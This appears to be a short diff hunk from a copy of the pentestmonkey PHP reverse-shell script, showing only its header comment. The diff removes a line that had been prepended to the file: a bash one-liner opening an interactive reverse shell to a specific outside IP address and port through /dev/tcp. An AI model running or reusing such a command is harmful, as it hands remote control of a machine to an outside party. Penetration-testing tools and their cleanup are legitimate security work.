@@ -1,4 +1,4 @@
-sh -i >& /dev/tcp/94.142.138.201/4444 0>&1a<?php
+<?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
